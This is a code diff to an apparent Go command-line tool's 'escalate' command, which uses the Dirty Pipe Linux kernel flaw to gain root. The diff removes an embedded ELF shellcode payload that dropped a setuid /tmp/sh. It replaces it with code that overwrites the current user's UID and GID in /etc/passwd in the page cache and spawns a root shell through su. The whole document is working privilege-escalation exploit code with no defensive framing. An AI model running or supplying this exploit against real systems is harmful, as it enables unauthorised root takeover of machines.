@@ -39,6 +39,9 @@ import (
 	"fmt"
 	"os"
 	"os/exec"
+	"io/ioutil"
+	"os/user"
+	"bufio"
 	"strings"
 	"syscall"
 
@@ -46,19 +49,7 @@ import (
 )
 
 /*
- * Credit: https://github.com/febinrev/dirtypipez-exploit
- *
- * Small (linux_x86_64) ELF file matroshka doll that does:
- *   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
- *   write(fd, elfcode, elfcode_len)
- *   chmod("/tmp/sh", 04755)
- *   close(fd);
- *   exit(0);
- *
- * The dropped ELF simply does:
- *   setuid(0);
- *   setgid(0);
- *   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
+ * Credit: https://github.com/eremus-dev/Dirty-Pipe-sudo-poc
  */
 // escalateCmd represents the escalate command
 var escalateCmd = &cobra.Command{
@@ -66,11 +57,10 @@ var escalateCmd = &cobra.Command{
 	Short: "attempt to escalate privileges to root on Linux",
 	Long:  `Escalate privileges to root on Linux using the dirtypipe exploit.`,
 	Run: func(cmd *cobra.Command, args []string) {
-		// TODO: Check for required variables
-
 		// Get original file data for cleanup
-		fmt.Printf("Making backup of %s\n", escalatePath)
-		origData, err := Backup(escalatePath)
+		var backupPath = "/tmp/passwd"
+		fmt.Printf("Backing up %s to %s\n", escalatePath, backupPath)
+		err := Backup(escalatePath, backupPath)
 		if err != nil {
 			fmt.Printf("error making backup: %s\n", err)
 			return
@@ -93,115 +83,122 @@ var escalateCmd = &cobra.Command{
 			return
 		}
 
+		username, err := getCurrentUser()
+		if err != nil {
+			fmt.Println(fmt.Errorf("error getting username: %w", err))
+			return
+		}
+		offset, toWrite, original, err := findOffsetOfUserInPasswd(username, escalatePath)
+		if err != nil {
+			fmt.Println(fmt.Errorf("error reading file: %w", err))
+		}
+
 		// Overwrite readonly file
 		fmt.Printf("Modifying %s in page cache\n", escalatePath)
-		err = Exploit(w, escalatePath, 1, ELFCODE)
+		err = Exploit(w, escalatePath, offset, []byte(toWrite))
 		if err != nil {
 			fmt.Println(fmt.Errorf("error performing the exploit: %w", err))
 			return
 		}
 
-		// Call modified suid binary
-		fmt.Printf("Executing modified  %s\n", escalatePath)
-		out, err := exec.Command(escalatePath).Output()
+		// Execute root shell
+		var sh = getDefaultShell()
+		fmt.Printf("Popping root shell\n\n", username)
+		var sargs = []string{"-c", "su " +  username}
+		err = Shell(sh, sargs)
 		if err != nil {
-			fmt.Println(fmt.Errorf("error executing suid: %w\n%s", err, out))
-			return
-
+			fmt.Println(fmt.Errorf("error spawning shell"))
 		}
 
 		// Cleanup
 		fmt.Printf("Restoring %s to original state\n", escalatePath)
-		err = Exploit(w, escalatePath, 1, origData)
+		err = Exploit(w, escalatePath, offset, []byte(original))
 		if err != nil {
-			fmt.Println(fmt.Errorf("error cleaning up suid: %w\n%s", err, out))
+			fmt.Println(fmt.Errorf("error cleaning up file: %w\n", err))
 			return
 
 		}
 
-		// Execute root shell
-		fmt.Printf("Popping root shell  %s\n\n", escalatePath)
-		sargs := []string{""}
-		Shell("/tmp/sh", sargs)
-
-		fmt.Println("\nRemember to remove /tmp/sh:")
-		fmt.Println("\trm /tmp/sh")
+		fmt.Printf("\nRemember to remove %s:\n", backupPath)
+		fmt.Printf("\trm %s\n", backupPath)
 
 	},
 }
 
 var escalatePath string
-var ELFCODE = []byte{
-	0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00,
-	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d,
-	0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02, 0x00, 0x00,
-	0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7,
-	0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2, 0xba, 0x00,
-	0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
-	0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1c,
-	0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00, 0x48, 0xc7,
-	0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7,
-	0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
-	0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01,
-	0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xba,
-	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
-	0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00,
-	0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00,
-	0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00, 0x6a, 0x00,
-	0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0, 0x3b, 0x00,
-	0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f,
-	0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
-}
 
 func init() {
 	rootCmd.AddCommand(escalateCmd)
 
 	// Here you will define your flags and configuration settings.
 
-	escalateCmd.Flags().StringVar(&escalatePath, "path", "/usr/bin/sudo", "Path to the suid executable")
+	escalateCmd.Flags().StringVar(&escalatePath, "path", "/etc/passwd", "Path to the passwd file")
 
 	// Cobra supports local flags which will only run when this command
 	// is called directly, e.g.:
 	// escalateCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
 }
 
-func Backup(path string) ([]byte, error) {
+func getDefaultShell() string {
+	return os.Getenv("SHELL")
+}
 
-	// Open suid binary in read-only mode
-	file, err := os.Open(path) // O_RDONLY mode
+func getCurrentUser() (string, error) {
+	currentUser, err := user.Current()
 	if err != nil {
-		return nil, fmt.Errorf("error opening SUID binary: %w", err)
-
+		return "", err
 	}
 
-	byteSlice := make([]byte, 2)
-	_, err = file.Read(byteSlice)
+	username := currentUser.Username
+	return username, nil
+}
+
+func findOffsetOfUserInPasswd(user string, path string) (int64, string, string, error) {
+	var fileOffset = 0
+	var toWrite = ""
+
+	file, err := os.Open(path)
 	if err != nil {
-		return nil, fmt.Errorf("error reading suid binary: %w", err)
+		return -1, "", "", fmt.Errorf("error opening file: %w", err)
+	}
+	defer file.Close()
+
+	fscanner := bufio.NewScanner(file)
+    	for fscanner.Scan() {
+		var line = fscanner.Text() + "\n"
+		if !strings.Contains(line, user) {
+			fileOffset += len(line)	
+		} else {
+			var fields = strings.Split(line, ":")
+			fileOffset += len(strings.Join(fields[:1], ":"))
+			var original = strings.Join(fields[1:], ":")
+			toWrite = ":0:" + strings.Join(fields[3:], ":")
+
+			// Pad end of line with new line chars to we don't error
+			var lengthDiff = len(original) - len(toWrite)
+			if lengthDiff > 0 {
+				toWrite = toWrite[:len(toWrite)] + strings.Repeat("\n", lengthDiff)
+			}
+			return int64(fileOffset), toWrite, original, nil
+		}
+    	}
+
+	return -1, "", "", fmt.Errorf("User was not found in %s", path)
+
+}
+
+func Backup(src string, dest string) error {
+	bytesRead, err := ioutil.ReadFile(src)
+   	if err != nil {
+		return fmt.Errorf("Error opening file: %w", err)
 	}
 
-	byteSlice = make([]byte, len(ELFCODE))
-	_, err = file.Read(byteSlice)
-	if err != nil {
-		return nil, fmt.Errorf("error reding suid binary: %w", err)
-	}
+	err = ioutil.WriteFile(dest, bytesRead, 0644)
 
-	return byteSlice, nil
+	if err != nil {
+		return fmt.Errorf("Error opening file: %w", err)
+	}
+	return nil
 }
 
 const PAGE int = 4096
@@ -229,17 +226,17 @@ func PreparePipe(read *os.File, write *os.File) (*os.File, error) {
 
 func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {
 
-	// Open suid binary in read-only mode
+	// Open file in read-only mode
 	file, err := os.Open(path) // O_RDONLY mode
 	if err != nil {
-		return fmt.Errorf("error opening SUID binary: %w", err)
+		return fmt.Errorf("error opening file: %w", err)
 
 	}
 
-	// Splice page of suid binary into pipe
+	// Splice page of file into pipe
 	syscall.Splice(int(file.Fd()), &fileOffset, int(write.Fd()), nil, 1, 0)
 	if err != nil {
-		return fmt.Errorf("error splicing suid into pipe: %w", err)
+		return fmt.Errorf("error splicing file into pipe: %w", err)
 
 	}
 
@@ -254,29 +251,13 @@ func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {
 }
 
 func Shell(path string, args []string) error {
-
-	// Get the current working directory.
-	cwd, err := os.Getwd()
-	if err != nil {
-		return fmt.Errorf("error retrieving current working directory: %w", err)
-	}
-
-	// Set up shell environment
-	pa := os.ProcAttr{
-		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
-		Dir:   cwd,
-	}
-
-	// Spawn shell
-	proc, err := os.StartProcess(path, args, &pa)
+	cmd := exec.Command(path, args...)
+	cmd.Stdin = os.Stdin
+    	cmd.Stdout = os.Stdout
+    	cmd.Stderr = os.Stderr
+	err := cmd.Run()
 	if err != nil {
 		return fmt.Errorf("error spawning shell: %w", err)
-	}
-
-	// Wait until user exits the shell
-	_, err = proc.Wait()
-	if err != nil {
-		return fmt.Errorf("error exiting shell: %w", err)
 	}
 
 	return nil
